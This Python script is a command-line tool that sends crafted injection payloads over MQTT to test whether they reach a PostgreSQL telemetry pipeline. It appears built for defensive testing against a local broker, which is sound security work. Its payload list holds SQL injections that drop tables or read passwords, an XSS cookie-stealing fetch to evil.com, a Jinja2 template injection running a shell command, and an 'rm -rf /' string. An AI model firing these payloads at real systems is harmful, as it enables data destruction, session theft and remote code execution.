#!/usr/bin/env python3
"""MQTT injection test CLI.

Publishes crafted payloads to the MQTT broker to test whether SQL injection,
XSS, or other malicious content survives through the pipeline into PostgreSQL.

Usage:
    python tools/inject.py                          # run all built-in payloads
    python tools/inject.py --payload "'; DROP TABLE telemetry_readings;--"
    python tools/inject.py --topic /telemetry/speed --field value --payload "NaN"
    python tools/inject.py --list                   # list built-in payloads
"""

import argparse
import json
import sys
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

BROKER_HOST = "localhost"
BROKER_PORT = 1883

INJECTION_PAYLOADS = [
    {
        "name": "classic-sqli",
        "description": "Classic SQL injection in sensor_id",
        "topic": "/telemetry/temperature",
        "overrides": {"sensor_id": "'; DROP TABLE telemetry_readings;--"},
    },
    {
        "name": "union-sqli",
        "description": "UNION-based SQL injection in vehicle field",
        "topic": "/telemetry/humidity",
        "overrides": {"vehicle": "' UNION SELECT password FROM users--"},
    },
    {
        "name": "xss-script",
        "description": "XSS script tag in manufacturer field",
        "topic": "/telemetry/speed",
        "overrides": {"manufacturer": "<script>alert('xss')</script>"},
    },
    {
        "name": "xss-img",
        "description": "XSS via img onerror in vehicle field",
        "topic": "/telemetry/rpm",
        "overrides": {"vehicle": '<img src=x onerror="fetch(\'http://evil.com/\'+document.cookie)">'},
    },
    {
        "name": "sqli-value",
        "description": "SQL injection via string in numeric value field",
        "topic": "/telemetry/battery_voltage",
        "overrides": {"value": "1; DELETE FROM telemetry_readings WHERE 1=1;--"},
    },
    {
        "name": "newline-injection",
        "description": "Newline/CRLF injection in sensor_id",
        "topic": "/telemetry/oil_temp",
        "overrides": {"sensor_id": "legit-sensor\r\n\r\nHTTP/1.1 200 OK\r\n"},
    },
    {
        "name": "null-byte",
        "description": "Null byte injection in VIN",
        "topic": "/telemetry/tire_pressure",
        "overrides": {"vin": "WBMDU12345\x00INJECTED"},
    },
    {
        "name": "unicode-homoglyph",
        "description": "Unicode homoglyph substitution in manufacturer",
        "topic": "/telemetry/fuel_level",
        "overrides": {"manufacturer": "BMD\u043euble\u0423ou"},  # Cyrillic о and У
    },
    {
        "name": "oversized-field",
        "description": "Oversized string in sensor_id (10KB)",
        "topic": "/telemetry/transmission_temp",
        "overrides": {"sensor_id": "A" * 10000},
    },
    {
        "name": "nested-json",
        "description": "Nested JSON object in string field",
        "topic": "/telemetry/brakepad_wear",
        "overrides": {"vehicle": '{"nested":true,"cmd":"rm -rf /"}'},
    },
    {
        "name": "sqli-timestamp",
        "description": "SQL injection in timestamp field",
        "topic": "/telemetry/temperature",
        "overrides": {"timestamp": "2026-01-01'); DROP TABLE agent_logs;--"},
    },
    {
        "name": "ssti-jinja",
        "description": "Server-side template injection (Jinja2)",
        "topic": "/telemetry/humidity",
        "overrides": {"vehicle": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
    },
]


def build_message(overrides: dict) -> dict:
    """Build a telemetry message with injected fields."""
    base = {
        "sensor_id": "inject-test-001",
        "vin": "WINJECT00000TEST",
        "manufacturer": "InjectionTest",
        "vehicle": "InjectionTest Probe",
        "color": "Red",
        "year": 2026,
        "value": 99.99,
        "unit": "test",
        "label": "injection_test",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    base.update(overrides)
    return base


def publish_payload(client: mqtt.Client, topic: str, payload: dict, name: str) -> bool:
    """Publish a single payload and return success."""
    data = json.dumps(payload)
    result = client.publish(topic, data, qos=1)
    result.wait_for_publish(timeout=5)
    if result.rc == mqtt.MQTT_ERR_SUCCESS:
        print(f"  [SENT] {name}: {topic} ({len(data)} bytes)")
        return True
    else:
        print(f"  [FAIL] {name}: publish error rc={result.rc}")
        return False


def run_all_payloads(client: mqtt.Client) -> tuple[int, int]:
    """Run all built-in injection payloads. Returns (sent, failed)."""
    sent = 0
    failed = 0
    for p in INJECTION_PAYLOADS:
        msg = build_message(p["overrides"])
        if publish_payload(client, p["topic"], msg, p["name"]):
            sent += 1
        else:
            failed += 1
    return sent, failed


def run_custom_payload(client: mqtt.Client, topic: str, field: str, payload: str):
    """Run a single custom injection payload."""
    overrides = {field: payload}
    msg = build_message(overrides)
    publish_payload(client, topic, msg, f"custom:{field}")


def main():
    parser = argparse.ArgumentParser(description="MQTT injection test CLI")
    parser.add_argument("--host", default=BROKER_HOST, help="MQTT broker host (default: localhost)")
    parser.add_argument("--port", type=int, default=BROKER_PORT, help="MQTT broker port (default: 1883)")
    parser.add_argument("--list", action="store_true", help="List all built-in payloads")
    parser.add_argument("--payload", type=str, help="Custom injection payload string")
    parser.add_argument("--field", type=str, default="sensor_id", help="Field to inject into (default: sensor_id)")
    parser.add_argument("--topic", type=str, default="/telemetry/temperature", help="MQTT topic (default: /telemetry/temperature)")
    parser.add_argument("--verify", action="store_true", help="Query Postgres after injection to verify results")
    args = parser.parse_args()

    if args.list:
        print(f"\n{'Name':<22} {'Topic':<30} Description")
        print("-" * 90)
        for p in INJECTION_PAYLOADS:
            print(f"{p['name']:<22} {p['topic']:<30} {p['description']}")
        print(f"\n{len(INJECTION_PAYLOADS)} payloads available.")
        return

    # Connect
    client = mqtt.Client(
        callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
        client_id="injection-tester",
    )
    connected = False

    def on_connect(_c, _u, _f, rc, _p):
        nonlocal connected
        connected = rc == 0

    client.on_connect = on_connect

    try:
        client.connect(args.host, args.port, keepalive=30)
    except (ConnectionRefusedError, OSError) as exc:
        print(f"Could not connect to MQTT broker at {args.host}:{args.port}: {exc}")
        sys.exit(1)

    client.loop_start()
    time.sleep(1)

    if not connected:
        print("Failed to connect to MQTT broker.")
        sys.exit(1)

    print(f"Connected to MQTT broker at {args.host}:{args.port}\n")

    if args.payload:
        # Custom payload
        print(f"Injecting custom payload into '{args.field}' on {args.topic}:")
        run_custom_payload(client, args.topic, args.field, args.payload)
    else:
        # All built-in payloads
        print(f"Running {len(INJECTION_PAYLOADS)} injection payloads:\n")
        sent, failed = run_all_payloads(client)
        print(f"\nResults: {sent} sent, {failed} failed")

    # Wait for messages to flush
    time.sleep(2)

    if args.verify:
        print("\nVerifying in PostgreSQL...")
        try:
            import psycopg2
            conn = psycopg2.connect("host=localhost port=5433 dbname=salt user=salt password=salt")
            cur = conn.cursor()

            # Check if injection payloads landed
            cur.execute("SELECT sensor_id, vin, manufacturer, vehicle, value, label FROM telemetry_readings WHERE vin = 'WINJECT00000TEST' ORDER BY ingested_at DESC LIMIT 15;")
            rows = cur.fetchall()
            if rows:
                print(f"\n  Found {len(rows)} injected rows in telemetry_readings:")
                for r in rows:
                    sid = r[0][:40] + "..." if len(str(r[0])) > 40 else r[0]
                    print(f"    sensor_id={sid}  vehicle={r[3][:30]}  value={r[4]}")
            else:
                print("  No injected rows found in telemetry_readings.")

            # Check tables still exist (injection didn't drop them)
            cur.execute("SELECT COUNT(*) FROM telemetry_readings;")
            total = cur.fetchone()[0]
            cur.execute("SELECT COUNT(*) FROM agent_logs;")
            agent = cur.fetchone()[0]
            print(f"\n  Tables intact: telemetry_readings={total} rows, agent_logs={agent} rows")

            conn.close()
        except ImportError:
            print("  psycopg2 not installed locally. Install with: pip install psycopg2-binary")
        except Exception as exc:
            print(f"  Postgres verification failed: {exc}")

    client.loop_stop()
    client.disconnect()
    print("\nDone.")


if __name__ == "__main__":
    main()
